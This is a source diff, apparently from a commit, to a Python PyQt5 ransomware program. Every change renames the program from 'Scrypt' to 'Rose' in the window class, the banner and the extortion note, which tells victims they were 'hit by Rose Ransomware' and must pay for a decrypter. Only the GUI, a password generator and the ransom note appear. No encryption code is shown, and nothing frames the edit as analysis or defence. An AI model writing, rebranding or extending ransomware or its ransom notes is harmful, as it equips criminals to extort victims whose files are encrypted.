@@ -99,7 +99,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 		return ''.join(random.choice(password_characters) for i in range(stringLength))
 
 
-class Scrypt(PyQt5.QtWidgets.QMainWindow):
+class Rose(PyQt5.QtWidgets.QMainWindow):
 	def __init__(self):
 		super().__init__() 
 		self.threadpool = PyQt5.QtCore.QThreadPool()
@@ -156,7 +156,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
 		rm.show()
 
 	def banner(self):
-		flair = PyQt5.QtWidgets.QLabel('Scrypt', self) 
+		flair = PyQt5.QtWidgets.QLabel('Rose', self) 
 		flair.setStyleSheet("""
 							QLabel{
 							background-color: #d50000;
@@ -179,7 +179,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
 detailedNote =f"""
 -------------------------------------------------------------------------------------------------------------------------
 Hello,\n
-	If you are reading this then you have likely been hit by Scrypt Ransomware\n
+	If you are reading this then you have likely been hit by Rose Ransomware\n
 	We apologize for the incovience, at the end of the day we just want to get paid\n
 	In order to receive the decrypter you must follow the following steps to truely recover\n
 	all your files.\n
@@ -211,5 +211,5 @@ Click the Button Below To Continue:
 
 if __name__ == "__main__":
 		app = PyQt5.QtWidgets.QApplication(sys.argv) 
-		l = Scrypt() 
+		l = Rose() 
 		sys.exit(app.exec()) 
